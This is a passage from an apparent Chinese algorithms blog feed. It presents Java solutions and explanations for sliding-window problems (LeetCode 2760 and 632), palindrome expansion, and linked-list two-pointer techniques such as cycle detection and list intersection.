class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2760-最长奇偶子数组"><a href="#2760-最长奇偶子数组" class="headerlink" title="2760. 最长奇偶子数组"></a>2760. 最长奇偶子数组</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/longest-even-odd-subarray-with-threshold/description/">2760. 最长奇偶子数组</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> 和一个整数 <code>threshold</code> 。</p><p>请你从 <code>nums</code> 的子数组中找出以下标 <code>l</code> 开头、下标 <code>r</code> 结尾 <code>(0 &lt;= l &lt;= r &lt; nums.length)</code> 且满足以下条件的 <strong>最长子数组</strong> ：</p><ul>    <li><code>nums[l] % 2 == 0</code></li>    <li>对于范围&nbsp;<code>[l, r - 1]</code> 内的所有下标 <code>i</code> ，<code>nums[i] % 2 != nums[i + 1] % 2</code></li>    <li>对于范围&nbsp;<code>[l, r]</code> 内的所有下标 <code>i</code> ，<code>nums[i] &lt;= threshold</code></li></ul><p>以整数形式返回满足题目要求的最长子数组的长度。</p><p><strong>注意：子数组</strong> 是数组中的一个连续非空元素序列。</p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>nums = [3,2,5,4], threshold = 5<strong>输出：</strong>3<strong>解释：</strong>在这个示例中，我们选择从 l = 1 开始、到 r = 3 结束的子数组 =&gt; [2,5,4] ，满足上述条件。因此，答案就是这个子数组的长度 3 。可以证明 3 是满足题目要求的最大长度。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>nums = [1,2], threshold = 2<strong>输出：</strong>1<strong>解释：</strong>在这个示例中，我们选择从 l = 1 开始、到 r = 1 结束的子数组 =&gt; [2] 。该子数组满足上述全部条件。可以证明 1 是满足题目要求的最大长度。</pre><p><strong>示例 3：</strong></p><pre><strong>输入：</strong>nums = [2,3,4,5], threshold = 4<strong>输出：</strong>3<strong>解释：</strong>在这个示例中，我们选择从 l = 0 开始、到 r = 2 结束的子数组 =&gt; [2,3,4] 。 该子数组满足上述全部条件。因此，答案就是这个子数组的长度 3 。可以证明 3 是满足题目要求的最大长度。</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= nums.length &lt;= 100 </code></li>    <li><code>1 &lt;= nums[i] &lt;= 100 </code></li>    <li><code>1 &lt;= threshold &lt;= 100</code></li></ul></div><ol><li><p>思路</p><blockquote><p>题目求区间长度，区间设定了规则，那么用双指针，结合if匹配规则找出最大的区间长度即可。</p></blockquote></li><li><p>解题方法</p><blockquote><p>滑动窗口，在条件里满足所有设定规则即可</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(1)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestAlternatingSubarray</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> threshold)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; n) &#123;</span><br><span class="line">            <span class="comment">// 先满足 nums[l] % 2 == 0</span></span><br><span class="line">            <span class="keyword">if</span> (nums[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(left &lt; n &amp;&amp; nums[left]  %<span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                right = left;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (right &gt;= n) <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 满足 nums[i] &lt;= threshold</span></span><br><span class="line">            <span class="keyword">if</span> (left == right &amp;&amp; nums[right] &lt;= threshold) &#123;</span><br><span class="line">                ans = Math.max(ans, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left == right &amp;&amp; nums[right] &gt; threshold) &#123;</span><br><span class="line">                right++;</span><br><span class="line">                left = right;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 满足 nums[i] % 2 != nums[i + 1] % 2</span></span><br><span class="line">            right++;</span><br><span class="line">            <span class="keyword">if</span>(right &lt; n &amp;&amp; (nums[right] % <span class="number">2</span> != nums[right-<span class="number">1</span>] % <span class="number">2</span>) &amp;&amp; nums[right] &lt;= threshold) &#123;</span><br><span class="line">                ans = Math.max(ans, right - left + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans != Integer.MIN_VALUE ? ans: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="632-最小区间"><a href="#632-最小区间" class="headerlink" title="632.最小区间"></a>632.最小区间</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/smallest-range-covering-elements-from-k-lists/description/">632. 最小区间</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>你有&nbsp;<code>k</code>&nbsp;个 <strong>非递减排列</strong> 的整数列表。找到一个 <strong>最小 </strong>区间，使得&nbsp;<code>k</code>&nbsp;个列表中的每个列表至少有一个数包含在其中。</p><p>我们定义如果&nbsp;<code>b-a &lt; d-c</code>&nbsp;或者在&nbsp;<code>b-a == d-c</code>&nbsp;时&nbsp;<code>a &lt; c</code>，则区间 <code>[a,b]</code> 比 <code>[c,d]</code> 小。</p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>nums = [[4,10,15,24,26], [0,9,12,20], [5,18,22,30]]<strong>输出：</strong>[20,24]<strong>解释：</strong> 列表 1：[4, 10, 15, 24, 26]，24 在区间 [20,24] 中。列表 2：[0, 9, 12, 20]，20 在区间 [20,24] 中。列表 3：[5, 18, 22, 30]，22 在区间 [20,24] 中。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>nums = [[1,2,3],[1,2,3],[1,2,3]]<strong>输出：</strong>[1,1]</pre><p><strong>提示：</strong></p><ul>    <li><code>nums.length == k</code></li>    <li><code>1 &lt;= k &lt;= 3500</code></li>    <li><code>1 &lt;= nums[i].length &lt;= 50</code></li>    <li><code>-10<sup>5</sup> &lt;= nums[i][j] &lt;= 10<sup>5</sup></code></li>    <li><code>nums[i]</code> 按非递减顺序排列</li></ul></div><ol><li><p>思路</p><blockquote><p>要求满足区间，可以用左右双指针去找；求每个列表都有一个数满足在区间内，可以用memo数组存储是否满足，当need满足列表长度时为满足所求，然后算出最小区间即可。</p></blockquote></li><li><p>解题方法</p><blockquote><p>思路在于把列表内的值都转化为hash映射，把列表都转化为index求是否所有的index都在区间内即可。</p></blockquote></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] smallestRange(List&lt;List&lt;Integer&gt;&gt; nums) &#123;</span><br><span class="line">        <span class="comment">// 整体思路：把列表里面的数都映射进hash表，然后用need数组need[nums.length]判断所求的区间是否都满足了每个列表都有一个数在区间内</span></span><br><span class="line">        Map&lt;Integer, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        <span class="comment">// 初始化满足的最小区间，最小值为所有列表里面的值的最小值，最大值为所有列表里面的值的最大值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> Integer.MAX_VALUE, maxVal = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> x: nums.get(i)) &#123;</span><br><span class="line">                List&lt;Integer&gt; list = map.getOrDefault(x, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;());</span><br><span class="line">                list.add(i);</span><br><span class="line">                map.put(x, list);</span><br><span class="line">                minVal = Math.min(minVal, x);</span><br><span class="line">                maxVal = Math.max(maxVal, x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 滑动窗口从最新值开始滑动</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> minVal, right = minVal;</span><br><span class="line">        <span class="comment">// 记录是否列表</span></span><br><span class="line">        <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[size];</span><br><span class="line">        <span class="type">int</span> <span class="variable">need</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bestL</span> <span class="operator">=</span> minVal, bestR = maxVal;</span><br><span class="line">        <span class="keyword">while</span>(right &lt;= maxVal) &#123;</span><br><span class="line">            <span class="comment">// 如果right在map当中</span></span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(right)) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> x: map.get(right)) &#123;</span><br><span class="line">                    <span class="comment">// 记录区间满足了第x个列表</span></span><br><span class="line">                    memo[x]++;</span><br><span class="line">                    <span class="keyword">if</span> (memo[x] == <span class="number">1</span>) need++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 当所有列表都满足了，记录区间大小，并缩小窗口</span></span><br><span class="line">            <span class="keyword">while</span>(need == size) &#123;</span><br><span class="line">                <span class="comment">// 缩小区间</span></span><br><span class="line">                <span class="keyword">if</span>(right - left &lt; bestR - bestL) &#123;</span><br><span class="line">                    bestL = left;</span><br><span class="line">                    bestR = right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(left)) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> x: map.get(left)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (memo[x] == <span class="number">1</span>) need--;</span><br><span class="line">                        memo[x]--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;bestL, bestR&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="中间向两端扩散指针"><a href="#中间向两端扩散指针" class="headerlink" title="中间向两端扩散指针"></a>中间向两端扩散指针</h5><p>中间向两端扩散，即左右指针分别朝左右两边扩散，常见为<code>寻找回文子串</code>，判断回文子串的重点为判断子串的长度是奇数还是偶数。</p><p>从给定位置寻找回文子串的算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 s 中寻找以 s[l] 和 s[r] 为中心的最长回文串</span></span><br><span class="line">String <span class="title function_">palindrome</span><span class="params">(String s, <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="comment">// 防止索引越界</span></span><br><span class="line">    <span class="keyword">while</span> (l &gt;= <span class="number">0</span> &amp;&amp; r &lt; s.length()</span><br><span class="line">            &amp;&amp; s.charAt(l) == s.charAt(r)) &#123;</span><br><span class="line">        <span class="comment">// 双指针，向两边展开</span></span><br><span class="line">        l--; r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回以 s[l] 和 s[r] 为中心的最长回文串</span></span><br><span class="line">    <span class="keyword">return</span> s.substring(l + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后寻找给定字符串的最长回文子串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="comment">// 以 s[i] 为中心的最长回文子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> palindrome(s, i, i);</span><br><span class="line">        <span class="comment">// 以 s[i] 和 s[i+1] 为中心的最长回文子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> palindrome(s, i, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// res = longest(res, s1, s2)</span></span><br><span class="line">        res = res.length() &gt; s1.length() ? res : s1;</span><br><span class="line">        res = res.length() &gt; s2.length() ? res : s2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;滑动窗口也为快慢指针。两个指针，&lt;code&gt;fast&lt;/code&gt;指针在前面探路，&lt;code&gt;slow&lt;/code&gt;指针负责在移动前做判断条件，然后再移动，两个指针覆盖的长度即为要找的元素空间。&lt;/p&gt;
&lt;p&gt;常见的快慢指针题目：找满足条件的最长子串、删除排序的重复元素等。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="双指针" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
    
    <category term="滑动窗口" scheme="https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>链表的逻辑相关，寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等</title>
    <link href="https://blog.zhengxiangling.com/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/"/>
    <id>https://blog.zhengxiangling.com/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/</id>
    <published>2023-10-13T08:10:00.000Z</published>
    <updated>2023-11-17T14:27:30.012Z</updated>
    
    <content type="html"><![CDATA[<p>本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。</p><span id="more"></span><h5 id="寻找倒数第-K-个节点"><a href="#寻找倒数第-K-个节点" class="headerlink" title="寻找倒数第 K 个节点"></a>寻找倒数第 K 个节点</h5><p>链表不同于数组，一开始并不知道长度，可通过找数据规律求解，如链表长度为 <code>n</code>，倒数第 <code>K</code> 个节点转化过来即为顺数第 <code>n-K+1</code> 个节点，可通过先遍历整个链表得出长度 <code>n</code>，再第二次遍历到<code>n-K+1</code>得到寻找节点。</p><p>但是上述需要循环两次遍历。</p><p>我们也可以通过一次遍历来实现（最优解）。运用双指针，指针 <code>p1</code> 从头结点先走 <code>k</code> 步，距离末尾空指针还剩 <code>n-k</code> 步，此时让 <code>p2</code> 指向链表头结点，<code>p1</code> 和 <code>p2</code> 同时走 <code>n-k</code> 步，此时 <code>p2</code> 在链尾 <code>null</code>，<code>p1</code> 正好在顺数第 <code>n-K+1</code> 个节点，即为倒数第 <code>K</code> 个节点，即为所求，算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回链表的倒数第 k 个节点</span></span><br><span class="line">ListNode <span class="title function_">findFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// p1 先走 k 步</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p2</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// p1 和 p2 同时走 n - k 步</span></span><br><span class="line">    <span class="keyword">while</span> (p1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        p2 = p2.next;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// p2 现在指向第 n - k + 1 个节点，即倒数第 k 个节点</span></span><br><span class="line">    <span class="keyword">return</span> p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="寻找链表中间位置"><a href="#寻找链表中间位置" class="headerlink" title="寻找链表中间位置"></a>寻找链表中间位置</h5><p>常规做法，我们先遍历整个链表寻找长度 <code>n</code>，然后在遍历 <code>n/2</code>寻找中间位置。</p><p>但是最优解可以通过一次循环来实现。</p><p>运用 <code>快慢指针</code> 的思想，让两个指针 <code>slow</code> <code>fast</code> 同时从头结点出发， <code>slow</code> 走一步,<code>fast</code> 走两步，当 <code>fast</code> 为空或者 <code>fast</code> 的下一节点为空，<code>slow</code> 则走到了中点位置，即为所求。算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ListNode <span class="title function_">middleNode</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="comment">// 快慢指针初始化指向 head</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="comment">// 快指针走到末尾时停止</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 慢指针走一步，快指针走两步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 慢指针指向中点</span></span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断链表是否有环"><a href="#判断链表是否有环" class="headerlink" title="判断链表是否有环"></a>判断链表是否有环</h5><p>思想也为运用 <code>快慢指针</code>，让两个指针 <code>slow</code> <code>fast</code> 同时从头结点出发， <code>slow</code> 走一步,<code>fast</code> 走两步，如果两个指针相遇在同一位置，则证明有环；当 <code>fast</code> 为空或者 <code>fast</code> 的下一节点为空，则证明没有环，算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="comment">// 快慢指针初始化指向 head</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="comment">// 快指针走到末尾时停止</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 慢指针走一步，快指针走两步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="comment">// 快慢指针相遇，说明含有环</span></span><br><span class="line">        <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不包含环</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断两个链表是否相交，并返回相交节点"><a href="#判断两个链表是否相交，并返回相交节点" class="headerlink" title="判断两个链表是否相交，并返回相交节点"></a>判断两个链表是否相交，并返回相交节点</h5><p>此解法我们可以做如下模拟，其中两个链表相交的点为 <code>3</code><br><br>链表1 <code>1,3,5,6,7</code>, <br><br>链表2 <code>2,3,4,8,9</code>, <br>,<br>然后把链表拼接如下 <br><br>链表1 + 链表2 &#x3D; 1,3,5,6,7,2,<code>3</code>,4,8,9 <br><br>链表2 + 链表1 &#x3D; 2,3,4,8,9,1,<code>3</code>,5,6,7</p><p>可以看出两条链表拼接之后，用两个指针分别同时前进，遇到相遇时，该节点即为相交节点。算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="comment">// p1 指向 A 链表头结点，p2 指向 B 链表头结点</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">        <span class="comment">// p1 走一步，如果走到 A 链表末尾，转到 B 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">null</span>) p1 = headB;</span><br><span class="line">        <span class="keyword">else</span>            p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2 走一步，如果走到 B 链表末尾，转到 A 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p2 == <span class="literal">null</span>) p2 = headA;</span><br><span class="line">        <span class="keyword">else</span>            p2 = p2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    
    <category term="快慢指针" scheme="https://blog.zhengxiangling.com/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>No.23 合并 K 个升序链表</title>
    <link href="https://blog.zhengxiangling.com/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <id>https://blog.zhengxiangling.com/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/</id>
    <published>2023-10-11T11:46:00.000Z</published>
    <updated>2023-11-17T14:27:30.006Z</updated>
    
    <content type="html"><![CDATA[<p>困难等级。</p><p>给你一个链表数组，每个链表都已经按升序排列。<br>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">示例 